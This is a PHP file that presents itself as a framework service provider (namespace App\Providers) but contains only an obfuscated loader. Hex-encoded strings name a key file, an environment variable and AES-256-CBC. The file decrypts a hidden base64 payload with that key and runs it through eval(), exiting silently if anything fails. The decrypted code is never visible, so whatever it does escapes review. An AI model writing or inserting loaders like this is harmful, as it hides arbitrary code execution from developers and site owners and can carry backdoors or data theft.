<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XBjTRIQYRBSkb4H9krdINw==');

$c=base64_decode(

'TTAgs/kgTBBgBs9mfJwB9/CiinwftDdPxUHg6CofAoEMqe2P6bS1yOmCHI/mvMnNcM6yMQXlahiJ' .
'Cv7c5Ro08Fj6hCTlqPTS9ugO23ZIeTJ/8nCiCxsV/h4034zSwfCoUTkAa4yOjo/dfZfkAtZ5SMVB' .
'Ix/O2Pw0UI6EaGPOsTWLVFaUzFQSnq+J2xl5sy7svtlE3ImqRuxataEGRXpw2Ark63n6zzsLzA+m' .
'YhwruY1bzbuN4Afx39tWyZHOJ+ypNboPe9I20h+AMcg1GlR1Qo4S5nL+38SfpdRDf6s54AH3Yzd1' .
'nM2VEfJVBseiAODI/DDS6lo02N9CY1LaEwV5BKI8p0hG1oL31IOjFS5Si6h2a9HbBt1T30fAvAC7' .
'72sDDp+zVEf06VqGFrN04EnclKqE14JuyXWa1+d6lbk6m5kCnasDFKRvcU6h9C1r4xmxDok2tsS5' .
'8ooJoo/qrBpIWqMGpHNpU52E1RViIzi1odr/2QkYN/KzmLpXHgbDH7nqZI49bWPpJWkaYwUNvY9a' .
'Ng7pEBnfLgU25jdXw1LsiE0oJZDk3jQ8wSu0YBWhjF6Zfa/1TUZeunPINnfhYfbtzGK3TsTABjp0' .
'PnfGzdfLmoJ5bPR3kJ1fs1Z2W+Tqtkg8uK6SR640QUu7qHJ34vLFwB9dC1l2YEXI/HeLn/l5lCoJ' .
'oUnNPKLM04EX4u1fSJKeR4+vm16WCq8UCNX+J0ussDXnjJ9JNLMJ2STPFCQPDvAyoh6ufha2ULr/' .
'BTTRp11gsoGM2+HhRVb92oxc8/kTT4yVPU1/I2qdXusl7X9pT2xrOq5MlXpSPSyktv0JrxoP9byg' .
'E7CTqn0X3ZkLpxC3Ji+WEce8QNzqn3Ft5R/8lwiP3sOjOHb5W9CgrFVqe1qWq9dx6WmzPkX4Ej4R' .
'9srqohsjSNh2KJ3LI0bL6kLEjU+zazcdk6DIjxJyeNrdSGcU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

